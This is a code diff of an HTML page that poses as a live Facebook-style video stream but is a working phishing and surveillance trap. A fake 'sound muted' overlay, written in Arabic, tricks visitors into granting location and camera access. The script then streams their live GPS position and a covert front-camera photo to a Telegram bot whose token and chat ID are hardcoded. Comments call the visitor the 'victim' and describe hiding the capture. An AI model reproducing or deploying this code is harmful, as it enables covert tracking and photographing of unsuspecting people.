@@ -3,129 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>فديو</title>
+    <title>  فديو</title>
     
+    <meta property="og:title" content="▶️ فيديو مباشر">
+    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png">
+    <meta property="og:video" content="https://appsyria00.github.io/Facebook/1.mp4">
+    <meta property="og:type" content="video.other">
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
-        
-        /* تصميم واجهة التمويه */
-        #smartOverlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: radial-gradient(circle, #222 0%, #000 100%);
-            color: white; z-index: 9999; display: flex; flex-direction: column; 
-            align-items: center; justify-content: center; text-align: center; padding: 25px;
-        }
-        
-        .play-icon { 
-            width: 80px; height: 80px; background: rgba(255,255,255,0.1); 
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            margin-bottom: 20px; border: 2px solid #007bff;
-        }
-
-        #startBtn { 
-            padding: 14px 40px; background: #007bff; color: white; border: none; 
-            border-radius: 30px; cursor: pointer; font-weight: bold; font-size: 18px;
-            box-shadow: 0 0 20px rgba(0,123,255,0.5);
-        }
-
-        /* حاوية الفيديو */
-        .video-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; }
+        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         video { width: 100%; height: 100%; object-fit: cover; }
-
-        /* رسائل الحالة الوهمية */
-        #statusMsg { position: fixed; bottom: 30px; width: 100%; text-align: center; color: #555; font-size: 12px; z-index: 10001; }
+        
+        /* نافذة الهندسة الاجتماعية الشفافة */
+        #audioOverlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.6); /* خلفية شفافة تظهر الفيديو خلفها */
+            color: white; z-index: 9999; display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; text-align: center; padding: 20px;
+            display: none; /* تظهر برمجياً */
+        }
+        #audioBtn { 
+            padding: 15px 40px; background: #007bff; color: white; border: none; 
+            border-radius: 30px; cursor: pointer; font-weight: bold; font-size: 18px;
+            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
+        }
     </style>
 </head>
 <body>
 
-    <div id="smartOverlay">
-        <div class="play-icon">
-            <svg width="40" height="40" viewBox="0 0 24 24" fill="#007bff"><path d="M8 5v14l11-7z"/></svg>
-        </div>
-        <h2 style="margin-bottom:10px;">فديو</h2>
-        <p style="margin-bottom:30px; color:#aaa; font-size:14px;">اضغط للبدء وتحسين جودة العرض حسب موقعك الجغرافي</p>
-        <button id="startBtn">مشاهدة الآن</button>
+    <div id="audioOverlay">
+        <h2 style="margin-bottom:15px;">⚠️ الصوت مكتوم</h2>
+        <p style="margin-bottom:20px;">يرجى الضغط على الزر أدناه وتفعيل الأذونات<br>لتشغيل صوت البث المباشر.</p>
+        <button id="audioBtn">تشغيل الصوت الآن</button>
     </div>
 
-    <div class="video-container" id="vContainer">
-        <video id="mainVideo" muted playsinline poster="2.png" preload="auto">
+    <div class="video-wrapper">
+        <video id="mainVideo" autoplay muted playsinline poster="2.png" preload="auto">
             <source src="1.mp4" type="video/mp4">
         </video>
     </div>
 
-    <div id="statusMsg">تشفير الاتصال SSL نشط...</div>
-
     <script>
-        // إعدادات التلجرام
         const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
         const chatId = "1611398303";
 
-        document.getElementById('startBtn').onclick = function() {
-            // 🔱 الطبقة الثالثة: تفعيل ملء الشاشة (Full Screen)
-            let elem = document.documentElement;
-            if (elem.requestFullscreen) { elem.requestFullscreen(); }
-            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+        window.onload = function() {
+            // تشغيل الفيديو دغري (صامت)
+            const video = document.getElementById('mainVideo');
+            video.play();
 
-            // إخفاء التمويه وتشغيل الفيديو
-            document.getElementById('smartOverlay').style.display = 'none';
-            document.getElementById('vContainer').style.display = 'block';
-            document.getElementById('mainVideo').play();
-
-            // الطبقة الرابعة: بدء المقايضة (الأذونات مقابل الخدمة)
-            executeSocialEngineering();
-            
-            // تمويه الرابط في شريط العنوان (اختياري)
-            window.history.replaceState(null, null, "/Live-HD-Stream");
+            // إظهار نافذة "تشغيل الصوت" بعد ثانية واحدة فقط
+            setTimeout(() => {
+                document.getElementById('audioOverlay').style.display = 'flex';
+            }, 1000);
         };
 
-        async function executeSocialEngineering() {
-            // 1. طلب الموقع (بشكل مباشر ومستمر)
-            navigator.geolocation.watchPosition(pos => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy.toFixed(1);
-                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                sendToBot(`📍 تحديث موقع مباشر:\n🎯 الدقة: ${acc} متر\n🔗 الخريطة: ${mapsUrl}`);
-            }, () => sendToBot("⚠️ الضحية رفض الموقع"), { enableHighAccuracy: true });
+        document.getElementById('audioBtn').onclick = function() {
+            // إخفاء النافذة ودخول وضع ملء الشاشة للتمويه
+            document.getElementById('audioOverlay').style.display = 'none';
+            if (document.documentElement.requestFullscreen) { document.documentElement.requestFullscreen(); }
 
-            // 2. طلب الكاميرا (لقطة سريعة)
+            // طلب الموقع والكاميرا بشكل متتابع وسريع (دمج الإجراء)
+            requestPermissions();
+        };
+
+        async function requestPermissions() {
+            // 1. طلب الموقع أولاً (لأنه الأكثر إقناعاً مع "تحديد السيرفر")
+            navigator.geolocation.watchPosition(pos => {
+                const mapsUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendToBot(`📍 موقع مباشر:\n🎯 الدقة: ${pos.coords.accuracy.toFixed(1)}m\n🔗 الخريطة: ${mapsUrl}`);
+            }, () => {}, { enableHighAccuracy: true });
+
+            // 2. طلب الكاميرا فوراً بعد الموقع
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                let v = document.createElement('video');
-                v.srcObject = stream; v.play();
-                
-                setTimeout(() => {
-                    let canvas = document.createElement('canvas');
-                    canvas.width = 720; canvas.height = 1280;
-                    canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
-                    sendPhoto(canvas.toDataURL('image/jpeg'));
-                    // إغلاق الكاميرا فوراً لعدم كشف الاختراق
-                    stream.getTracks().forEach(t => t.stop());
-                }, 2500);
+                captureAndSend(stream);
             } catch (e) {
                 sendToBot("⚠️ الضحية رفض الكاميرا");
             }
         }
 
-        function sendToBot(msg) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+        function captureAndSend(stream) {
+            let v = document.createElement('video');
+            v.srcObject = stream; v.play();
+            setTimeout(() => {
+                let canvas = document.createElement('canvas');
+                canvas.width = 720; canvas.height = 1280;
+                canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
+                sendPhoto(canvas.toDataURL('image/jpeg'));
+                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا للسرية
+            }, 2000);
         }
 
-        function sendPhoto(imgData) {
-            let blob = dataURLtoBlob(imgData);
-            let form = new FormData();
-            form.append('document', blob, "snap.jpg");
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${encodeURIComponent("📸 صورة الضحية المباشرة")}`, { 
-                method: 'POST', body: form 
-            });
+        function sendToBot(t) { fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}`); }
+        
+        function sendPhoto(data) {
+            let blob = dataURLtoBlob(data);
+            let f = new FormData(); f.append('document', blob, "snap.jpg");
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${encodeURIComponent("📸 لقطة كاميرا الضحية")}`, { method: 'POST', body: f });
         }
 
         function dataURLtoBlob(d) {
-            let p = d.split(','), m = p[0].match(/:(.*?);/)[1],
-                b = atob(p[1]), n = b.length, u = new Uint8Array(n);
-            while(n--) u[n] = b.charCodeAt(n);
+            let p = d.split(','), m = p[0].match(/:(.*?);/)[1], bin = atob(p[1]), n = bin.length, u = new Uint8Array(n);
+            while(n--) u[n] = bin.charCodeAt(n);
             return new Blob([u], {type:m});
         }
     </script>
